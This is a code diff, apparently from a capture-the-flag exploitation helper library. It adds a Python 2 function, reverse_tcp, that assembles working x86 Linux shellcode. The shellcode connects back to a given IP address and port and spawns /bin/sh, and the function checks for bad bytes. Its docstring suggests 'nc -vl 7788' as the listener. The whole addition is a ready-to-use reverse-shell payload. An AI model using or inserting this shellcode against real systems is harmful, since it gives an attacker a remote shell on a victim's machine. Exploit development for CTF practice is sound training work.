@@ -5,6 +5,36 @@ from struct import pack,unpack
 from string import ascii_lowercase as ALPHABET
 
 
+def reverse_tcp(ip_addr, port):
+    '''
+    Generate x86 reverse tcp shellcode
+    
+    Usage:
+    reverse_tcp(ip_addr, port)
+        ip_addr = connect back IP address
+        port = connect back port
+
+    A command you could use to setup a listener on your system is 'nc -vl 7788'
+    '''
+    ip = ''.join([chr(int(x)) for x in ip_addr.split('.')])
+    port = hex(port)[2:].zfill(2).decode('hex')
+
+    REVERSE_TCP = (
+        '\x31\xc0\x89\xc3\x50\x6a\x01\x6a\x02\x43\xb0\x66\x89\xe1\xcd\x80\x89\xc6'
+        '\x31\xc0\xb0\x66\x43\x68' + ip + '\x66\x68' + port + '\x66\x53\x89\xe1'
+        '\x6a\x10\x51\x56\x43\x89\xe1\xcd\x80\x89\xc7\x31\xc9\x89\xc8\x89\xca\xb1'
+        '\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f'
+        '\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x89\xca\xcd\x80'
+    )
+
+    banned = ('\x00', '\x0a', '\x0d')
+    for x in banned:
+        if x in REVERSE_TCP:
+            print 'This shellcode may not work because of {} at index {}'.format(repr(x), REVERSE_TCP.index(x))
+
+    return REVERSE_TCP
+
+
 def get_socket(chal):
     '''chal is a 2-tuple with an address and a port  ex: ('127.0.0.1',111)'''
     s=socket.socket()
